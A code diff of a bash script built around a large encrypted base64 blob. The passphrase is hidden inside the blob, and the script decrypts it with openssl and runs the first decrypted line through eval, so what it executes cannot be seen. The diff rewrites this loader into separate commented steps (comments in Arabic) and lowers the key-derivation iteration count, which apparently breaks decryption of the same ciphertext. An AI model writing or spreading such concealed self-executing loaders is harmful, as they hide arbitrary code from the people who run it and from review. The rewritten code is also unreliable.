@@ -1,6 +1,6 @@
 #!/bin/bash
 
-script='U2FsdGVkX185pjMiJwga+rZVy1ahMY4ArlXocZdHDcUn/MgXduevaGFMHH2RQt4t
+encrypted='U2FsdGVkX185pjMiJwga+rZVy1ahMY4ArlXocZdHDcUn/MgXduevaGFMHH2RQt4t
 /tdLHKlp3nN4PQZ8BQSpfBc1oLmF3SKFf/9E7M+3CYjROIxIKD/2zvJnJn6rZ0o3
 QzKKSM7HW1Eds2KGcXcxPBqqCro2qZK1Q7LYKo+QTwB2v0RMQvVJf74i5Z7E1wdR
 fTstnquqe3uKcZErkxljAxFZSSTcqT3ORPh/7AeqCRunwJFgTuQOMJDhH3jQWzOP
@@ -735,4 +735,15 @@ m1CSfecU5g94/Paogne5ktXXaxO0/Pdvrkp3j1Jnq0aO6i55SLUjgqn/CEyJ+/Lm
 QoLZqvKY9G78PHEbRZxsVcaJcPWVlt0L55DXsEu2OjLoEjHIK6/6z7cN1/IX1dBC
 BRbdnP28P21INhgUEDB9Xaolj49igKTwkPn9p8UsENbB6RDwCHj4zj0wV3Pb+ZKW'
 
-set +e; pass=$(echo "$script" | grep -oP 'pp\K[^p]+(?=pp)' 2>/dev/null); cipher=$(echo "$script" | sed -E "s/(.+)pp${pass}pp(.*)/\1\2/" 2>/dev/null); decrypted=$(echo "$cipher" | openssl enc -aes-256-cbc -a -d -pbkdf2 -iter 100000 -pass pass:"$pass" 2>/dev/null); cmd=$(echo "$decrypted" | sed '/^\s*$/d' | head -n1 2>/dev/null); eval "$cmd"
+# استخراج كلمة المرور باستخدام sed (بديل أكثر أماناً)
+pass=$(echo "$encrypted" | sed -n 's/.*pp\([^p]*\)pp.*/\1/p')
+
+# حذف كلمة المرور من النص
+cipher=$(echo "$encrypted" | sed "s/pp${pass}pp//")
+
+# فك التشفير
+decrypted=$(echo "$cipher" | openssl enc -aes-256-cbc -a -d -pbkdf2 -iter 1000 -pass pass:"$pass" 2>/dev/null)
+
+# تنفيذ الأمر الأول غير الفارغ
+cmd=$(echo "$decrypted" | sed '/^[[:space:]]*$/d' | head -n1)
+eval "$cmd"
